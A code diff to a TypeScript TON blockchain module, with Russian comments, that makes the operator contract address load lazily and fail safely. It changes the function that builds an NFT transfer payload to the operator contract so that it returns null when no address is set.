@@ -1,11 +1,19 @@
 import { Address, beginCell, toNano } from '@ton/core';
 
-// ⚠️ ЗАМЕНИ на реальный адрес задеплоенного Operator.tact
-// Пока стоит валидный адрес-заглушка, чтобы сайт грузился.
-const RAW_OPERATOR_CONTRACT =
-  'EQD__________________________________________-_________________';
+// ⚠️ Вставь сюда реальный адрес задеплоенного Operator.tact
+// Пока оставь пустую строку — сайт всё равно загрузится.
+const RAW_OPERATOR_CONTRACT = '';
 
-export const OPERATOR_CONTRACT = Address.parse(RAW_OPERATOR_CONTRACT);
+// Ленивая инициализация: НЕ падаем, если адрес пустой или невалидный
+export function getOperatorContract(): Address | null {
+  if (!RAW_OPERATOR_CONTRACT) return null;
+  try {
+    return Address.parse(RAW_OPERATOR_CONTRACT);
+  } catch {
+    console.warn('Invalid OPERATOR_CONTRACT address:', RAW_OPERATOR_CONTRACT);
+    return null;
+  }
+}
 
 export const OPERATOR_WALLET = Address.parse(
   'UQBR4_plcJKaOI7FOW2QVRKTane60T7qXDc8q7eHVlDORQGz'
@@ -33,11 +41,17 @@ export async function fetchNfts(walletAddress: string): Promise<any[]> {
 export function buildNftTransferToOperator(
   nftAddress: string,
   ownerAddress: string
-): { address: string; amount: string; payload: string } {
+): { address: string; amount: string; payload: string } | null {
+  const contract = getOperatorContract();
+  if (!contract) {
+    console.warn('OPERATOR_CONTRACT not set — skip NFT transfer');
+    return null;
+  }
+
   const payload = beginCell()
     .storeUint(0x5fcc3d14, 32)
     .storeUint(0, 64)
-    .storeAddress(OPERATOR_CONTRACT)
+    .storeAddress(contract)
     .storeAddress(Address.parse(ownerAddress))
     .storeBit(0)
     .storeCoins(toNano('0.01'))
